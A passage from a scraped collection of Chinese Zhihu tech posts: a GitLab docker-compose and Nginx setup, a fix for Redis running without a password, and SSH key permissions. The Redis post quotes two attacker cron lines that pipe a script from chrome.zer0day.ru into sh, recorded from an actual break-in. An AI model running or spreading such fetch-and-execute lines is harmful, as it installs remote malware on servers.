class=\"m\">1</span><span class=\"w\">\n</span><span class=\"w\">    </span>command<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>--loglevel<span class=\"w\"> </span>warning<span class=\"w\">\n</span><span class=\"w\">    </span>volumes<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># redis 储存空间挂载到外部</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>/data/gitlab/redis<span class=\"p\">:</span>/var/lib/redis<span class=\"p\">:</span>Z<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">  </span>postgresql<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>restart<span class=\"p\">:</span><span class=\"w\"> </span>always<span class=\"w\">\n</span><span class=\"w\">    </span>image<span class=\"p\">:</span><span class=\"w\"> </span>sameersbn/postgresql<span class=\"p\">:</span><span class=\"m\">10</span><span class=\"w\">\n</span><span class=\"w\">    </span>volumes<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># postgresql 储存空间挂载到外部</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>/data/gitlab/postgresql<span class=\"p\">:</span>/var/lib/postgresql<span class=\"p\">:</span>Z<span class=\"w\">\n</span><span class=\"w\">    </span>environment<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_USER=gitlab<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_PASS=password<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_NAME=gitlabhq_production<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_EXTENSION=pg_trgm<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">  </span>gitlab<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>restart<span class=\"p\">:</span><span class=\"w\"> </span>always<span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># 此处应注意修改为 9.2.5 版本，最新版通过 repo by URL 从其他仓库迁移过来的项目使用 create merge request 时会出现 503 bug</span><span class=\"w\">\n</span><span class=\"w\">    </span>image<span class=\"p\">:</span><span class=\"w\"> </span>sameersbn/gitlab<span class=\"p\">:</span><span class=\"m\">9.2</span>.<span class=\"m\">5</span><span class=\"w\">\n</span><span class=\"w\">    </span>depends_on<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>redis<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>postgresql<span class=\"w\">\n</span><span class=\"w\">    </span>ports<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># 将容器中的 80、443、22 端口映射到宿主机</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span><span class=\"s2\">&#34;127.0.0.1:10080:80&#34;</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span><span class=\"s2\">&#34;127.0.0.1:10443:443&#34;</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span><span class=\"s2\">&#34;10022:22&#34;</span><span class=\"w\">\n</span><span class=\"w\">    </span>volumes<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># gitlab 储存空间挂载到外部</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>/data/gitlab/gitlab<span class=\"p\">:</span>/home/git/data<span class=\"p\">:</span>Z<span class=\"w\">\n</span><span class=\"w\">    </span>environment<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DEBUG=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_ADAPTER=postgresql<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_HOST=postgresql<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_PORT=<span class=\"m\">5432</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_USER=gitlab<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_PASS=password<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>DB_NAME=gitlabhq_production<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>REDIS_HOST=redis<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>REDIS_PORT=<span class=\"m\">6379</span><span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>TZ=Asia/Kolkata<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_TIMEZONE=Kolkata<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_HTTPS=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SSL_SELF_SIGNED=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    \n</span><span class=\"w\">    </span><span class=\"c\"># 此处需要改为你访问 gitlab 的域名或者IP</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_HOST=xxx<span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># 如果访问时使用 http 为 80，https 则为 443</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_PORT=<span class=\"m\">80</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_SSH_PORT=<span class=\"m\">10022</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_RELATIVE_URL_ROOT=<span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># 为了安全起见可以使用 pwgen -Bsv1 64 命令生成随机的 64 个字符串值替换下面三个变量的值</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_SECRETS_DB_KEY_BASE=long-and-random-alphanumeric-string<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_SECRETS_SECRET_KEY_BASE=long-and-random-alphanumeric-string<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_SECRETS_OTP_KEY_BASE=long-and-random-alphanumeric-string<span class=\"w\">\n</span><span class=\"w\">    \n</span><span class=\"w\">    </span><span class=\"c\"># 需要设置一个默认的 root 用户邮箱，密码不填第一次登录会让你自己设置</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_ROOT_PASSWORD=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_ROOT_EMAIL=xxx@xxx.xxx<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_NOTIFY_ON_BROKEN_BUILDS=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_NOTIFY_PUSHER=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_EMAIL=notifications@example.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_EMAIL_REPLY_TO=noreply@example.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_INCOMING_EMAIL_ADDRESS=reply@example.com<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_BACKUP_SCHEDULE=daily<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>GITLAB_BACKUP_TIME=<span class=\"m\">01</span><span class=\"p\">:</span><span class=\"m\">00</span><span class=\"w\">\n</span><span class=\"w\">    \n</span><span class=\"w\">    </span><span class=\"c\"># 以下为 QQ 企业邮箱配置</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_ENABLED=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_DOMAIN=exmail.qq.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_HOST=smtp.exmail.qq.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_PORT=<span class=\"m\">465</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_USER=xxx@xxx.xxx<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_PASS=password<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_STARTTLS=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span><span class=\"c\"># SMTP_TLS 选项原始配置文件中没有，默认为 false，使用 QQ 企业邮箱一定要加上，否则无法发送邮件</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_TLS=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>SMTP_AUTHENTICATION=login<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_ENABLED=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_HOST=imap.gmail.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_PORT=<span class=\"m\">993</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_USER=mailer@example.com<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_PASS=password<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_SSL=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>IMAP_STARTTLS=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_ENABLED=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTO_SIGN_IN_WITH_PROVIDER=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_ALLOW_SSO=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_BLOCK_AUTO_CREATED_USERS=<span class=\"kc\">true</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTO_LINK_LDAP_USER=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTO_LINK_SAML_USER=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_EXTERNAL_PROVIDERS=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_LABEL=cas3<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_SERVER=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_DISABLE_SSL_VERIFICATION=<span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_LOGIN_URL=/cas/login<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_VALIDATE_URL=/cas/p3/serviceValidate<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CAS3_LOGOUT_URL=/cas/logout<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GOOGLE_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GOOGLE_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GOOGLE_RESTRICT_DOMAIN=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_FACEBOOK_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_FACEBOOK_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_TWITTER_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_TWITTER_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITHUB_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITHUB_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITHUB_URL=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITHUB_VERIFY_SSL=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITLAB_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_GITLAB_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_BITBUCKET_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_BITBUCKET_APP_SECRET=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ASSERTION_CONSUMER_SERVICE_URL=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_IDP_CERT_FINGERPRINT=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_IDP_SSO_TARGET_URL=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ISSUER=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_LABEL=<span class=\"s2\">&#34;Our SAML Provider&#34;</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_NAME_IDENTIFIER_FORMAT=urn<span class=\"p\">:</span>oasis<span class=\"p\">:</span>names<span class=\"p\">:</span>tc<span class=\"p\">:</span>SAML<span class=\"p\">:</span><span class=\"m\">2.0</span><span class=\"p\">:</span>nameid-format<span class=\"p\">:</span>transient<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_GROUPS_ATTRIBUTE=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_EXTERNAL_GROUPS=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ATTRIBUTE_STATEMENTS_EMAIL=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ATTRIBUTE_STATEMENTS_NAME=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ATTRIBUTE_STATEMENTS_FIRST_NAME=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_SAML_ATTRIBUTE_STATEMENTS_LAST_NAME=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CROWD_SERVER_URL=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CROWD_APP_NAME=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_CROWD_APP_PASSWORD=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTH0_CLIENT_ID=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTH0_CLIENT_SECRET=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AUTH0_DOMAIN=<span class=\"w\">\n</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AZURE_API_KEY=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AZURE_API_SECRET=<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>OAUTH_AZURE_TENANT_ID=<span class=\"w\">\n</span><span class=\"w\">\n</span></code></pre></div><p><b>注：请注意有注释的变量！</b><br/>主要有以下几个关键点：</p><ol><li>将 Redis、PostgreSQL、Gitlab 的储存空间挂载到外部；</li><li><code>sameersbn/gitlab</code> 镜像的版本建议使用 10 以下，这里使用的 9.2.5。否则可能会有 bug;</li><li>设置 <code>GITLAB_HOST</code>、<code>GITLAB_PORT</code>，GITLAB_HOST 会在仓库地址中得到体现，如果你用域名访问此处就为域名，用 IP 访问此处为 IP。GITLAB_PORT 取决于访问 gitlab 的协议，http 为 80，https 则为 443;</li><li>设置一个 root 邮箱；</li><li>使用 QQ 企业邮箱发送邮件一定要加上 <code>SMTP_TLS=true</code>, 否则邮件发送不了。其他邮箱配置请参考 <a href=\"https://link.zhihu.com/?target=https%3A//docs.gitlab.com/omnibus/settings/smtp.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Gitlab 官方配置</a>。</li></ol><p>在配置文件 <code>docker-compose.yml</code> 所在目录下执行下列命令启动 Gitlab:</p><div class=\"highlight\"><pre><code class=\"language-bash\">sudo docker-compose up -d</code></pre></div><h2>Nginx 配置</h2><h2>http 协议</h2><div class=\"highlight\"><pre><code class=\"language-nginx\"><span class=\"k\">upstream</span> <span class=\"s\">gitlab</span> <span class=\"p\">{</span>\n        <span class=\"kn\">server</span> <span class=\"n\">127.0.0.1</span><span class=\"p\">:</span><span class=\"mi\">10080</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">server</span> <span class=\"p\">{</span>\n    <span class=\"kn\">server_name</span> <span class=\"s\">git.xxx.xxx</span><span class=\"p\">;</span>\n    <span class=\"kn\">listen</span> <span class=\"mi\">80</span><span class=\"p\">;</span>\n\n    <span class=\"kn\">location</span> <span class=\"s\">/</span> <span class=\"p\">{</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">Host</span> <span class=\"nv\">$host</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Real-IP</span> <span class=\"nv\">$remote_addr</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Forwarded-For</span> <span class=\"nv\">$proxy_add_x_forwarded_for</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_pass</span> <span class=\"s\">http://gitlab</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span></code></pre></div><h2>https 协议</h2><div class=\"highlight\"><pre><code class=\"language-nginx\"><span class=\"k\">upstream</span> <span class=\"s\">gitlab</span> <span class=\"p\">{</span>\n        <span class=\"kn\">server</span> <span class=\"n\">127.0.0.1</span><span class=\"p\">:</span><span class=\"mi\">10080</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">server</span> <span class=\"p\">{</span>\n    <span class=\"kn\">listen</span> <span class=\"mi\">80</span><span class=\"p\">;</span>\n    <span class=\"kn\">server_name</span> <span class=\"s\">git.xxx.xxx</span><span class=\"p\">;</span>\n    <span class=\"kn\">rewrite</span> <span class=\"s\">^/(.*)</span>$ <span class=\"s\">https://git.xxx.xxx/</span><span class=\"nv\">$1</span> <span class=\"s\">permanent</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">server</span> <span class=\"p\">{</span>\n    <span class=\"kn\">server_name</span> <span class=\"s\">git.xxx.xxx</span><span class=\"p\">;</span>\n    <span class=\"kn\">listen</span> <span class=\"mi\">443</span> <span class=\"s\">ssl</span><span class=\"p\">;</span>\n    <span class=\"kn\">ssl</span> <span class=\"no\">on</span><span class=\"p\">;</span>\n\n    <span class=\"kn\">ssl_certificate</span> <span class=\"s\">/etc/nginx/xxx.crt</span><span class=\"p\">;</span>\n    <span class=\"kn\">ssl_certificate_key</span> <span class=\"s\">/etc/nginx/xxx.key</span><span class=\"p\">;</span>\n\n    <span class=\"kn\">location</span> <span class=\"s\">/</span> <span class=\"p\">{</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">Host</span> <span class=\"nv\">$host</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Real-IP</span> <span class=\"nv\">$remote_addr</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Forwarded-For</span> <span class=\"nv\">$proxy_add_x_forwarded_for</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_pass</span> <span class=\"s\">http://gitlab</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span></code></pre></div><h2>载入 Gitlab Nginx 配置</h2><p>配置好相应的协议的配置文件，执行下列命令使其生效：</p><div class=\"highlight\"><pre><code class=\"language-bash\">sudo nginx -s reload</code></pre></div><p>访问域名即可进入 gitlab 首页。</p><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//docker_practice.gitee.io/install/ubuntu.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Ubuntu 安装 Docker CE</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/sameersbn/docker-gitlab\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">sameersbn/docker-gitlab</a></li></ol>", 
            "topic": [
                {
                    "tag": "Docker", 
                    "tagLink": "https://api.zhihu.com/topics/19950993"
                }, 
                {
                    "tag": "Linux", 
                    "tagLink": "https://api.zhihu.com/topics/19554300"
                }, 
                {
                    "tag": "Git", 
                    "tagLink": "https://api.zhihu.com/topics/19557710"
                }
            ], 
            "comments": [
                {
                    "userName": "霜雪明", 
                    "userLink": "https://www.zhihu.com/people/57deeee18708b6e56ee84506a3255dba", 
                    "content": "挂载卷指令最后面的: Z表示什么意思", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43654441", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 3, 
            "title": "使用 docker-compose 在 Docker 中启动有密码的 Redis 容器", 
            "content": "<h2><b>前言</b></h2><p>在服务器上使用 docker-compose 启动一个 Docker 中的 Redis 时，配置文件没有生效，Redis 没有加密码，导致 redis 中被写入两条记录:</p><div class=\"highlight\"><pre><code class=\"language-bash\">*/3 * * * * wget -q -O- http://chrome.zer0day.ru:5050/mrx1 <span class=\"p\">|</span> sh\n*/1 * * * * curl -fsSL http://chrome.zer0day.ru:5050/mrx1 <span class=\"p\">|</span> sh</code></pre></div><p>还好及时发现，在此记录一下解决过程。</p><h2><b>解决过程</b></h2><h2><b>方案一</b></h2><p>在 <code>docker-compose.yml</code> 文件中写入下列内容:</p><div class=\"highlight\"><pre><code class=\"language-yaml\">redis<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">  </span>image<span class=\"p\">:</span><span class=\"w\"> </span>redis<span class=\"w\">\n</span><span class=\"w\">  </span>container_name<span class=\"p\">:</span><span class=\"w\"> </span>my_redis<span class=\"w\">\n</span><span class=\"w\">  </span>command<span class=\"p\">:</span><span class=\"w\"> </span>redis-server<span class=\"w\"> </span>/usr/local/etc/redis/redis.conf<span class=\"w\">\n</span><span class=\"w\">  </span>ports<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span><span class=\"s2\">&#34;6379:6379&#34;</span><span class=\"w\">\n</span><span class=\"w\">  </span>volumes<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>./data<span class=\"p\">:</span>/data<span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>./redis.conf<span class=\"p\">:</span>/usr/local/etc/redis/redis.conf</code></pre></div><p>其中：</p><ol><li>image 代表镜像名称；</li><li>container_name 代表生成的容器名称；</li><li>command 代表生成容器后要执行的命令；</li><li>ports 将容器内的端口映射到容器外；</li><li>volumes 代表共享目录或文件，冒号前为宿主机目录，冒号后为容器内目录。举例：<code>- ./data:/data</code> 意为将当前目录共享到容器内的 <code>/data</code> 目录，相当于做了一个软连接。 </li></ol><p><b>注：共享目录或文件时如果宿主机或容器内不存在 docker 会自动帮你创建。</b> </p><p>Redis 的密码需要自己在与容器共享的配置 <code>redis.conf</code> 中加入，即更改配置中 <code>requirepass</code> 为:</p><div class=\"highlight\"><pre><code class=\"language-yaml\">requirepass<span class=\"w\"> </span>yourpassword</code></pre></div><p>在 <code>docker-compose.yml</code> 所在目录下执行 <code>docker-compose up -d</code>，即可在 Docker 中生成一个带密码的 Redis 容器。</p><h2><b>方案二</b></h2><p>同样在 <code>docker-compose.yml</code> 中写入下列内容：</p><div class=\"highlight\"><pre><code class=\"language-yaml\">redis<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">  </span>image<span class=\"p\">:</span><span class=\"w\"> </span>redis<span class=\"w\">\n</span><span class=\"w\">  </span>container_name<span class=\"p\">:</span><span class=\"w\"> </span>my_redis<span class=\"w\">\n</span><span class=\"w\">  </span>command<span class=\"p\">:</span><span class=\"w\"> </span>redis-server<span class=\"w\"> </span>--requirepass<span class=\"w\"> </span>yourpassword<span class=\"w\">\n</span><span class=\"w\">  </span>ports<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span><span class=\"s2\">&#34;6379:6379&#34;</span><span class=\"w\">\n</span><span class=\"w\">  </span>volumes<span class=\"p\">:</span><span class=\"w\">\n</span><span class=\"w\">    </span>-<span class=\"w\"> </span>./data<span class=\"p\">:</span>/data</code></pre></div><p>然后直接在其所在目录下执行 <code>docker-compose up -d</code>，即可在 Docker 中生成一个带密码的 Redis 容器。</p><h2><b>总结</b></h2><p>方案一的好处是可以更多的定制 Redis 的配置，方案二的好处是可以快速启动一个带免密的 Docker Redis 实例而不需要依赖外部的 redis.conf。</p>", 
            "topic": [
                {
                    "tag": "Redis", 
                    "tagLink": "https://api.zhihu.com/topics/19557280"
                }, 
                {
                    "tag": "Docker", 
                    "tagLink": "https://api.zhihu.com/topics/19950993"
                }, 
                {
                    "tag": "Docker Compose", 
                    "tagLink": "https://api.zhihu.com/topics/20104983"
                }
            ], 
            "comments": [
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>你没发现你的yaml写错了吗</p><p></p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/40397043", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "服务器authorized_keys添加公钥后登录仍需要密码", 
            "content": "<h2>问题</h2><p>在服务器的 <code>~/.ssh/authorized_keys</code> 文件内加入自己的公钥, 按理说下次在有该公钥的机器登录服务器时可以免密登录。但在一台服务器上遇到无法免密登录的情况。</p><h2>解决方案</h2><p>造成这个问题的原因是 <code>~/.ssh</code> 文件夹和，文件夹内的文件权限不对。</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ <span class=\"nb\">cd</span> ~\n$ chmod <span class=\"m\">700</span> .ssh\n$ <span class=\"nb\">cd</span> .ssh\n$ chmod <span class=\"m\">644</span> authorized_keys id_rsa.pub\n$ chmod <span class=\"m\">600</span> id_rsa</code></pre></div><p>更改文件夹和文件为合适的权限后即可实现免密登录。<br/>为什么要使用几个权限并不太清楚，虽然只要不给其他用户和用户组可写的权限都可以正常使用免密登录，但是尽量还是按照这几个文件及文件夹默认的权限去设置。</p>", 
            "topic": [
                {
                    "tag": "SSH(Secure Shell)", 
                    "tagLink": "https://api.zhihu.com/topics/19557973"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/38201027", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 3, 
            "title": "常用命令行快捷键", 
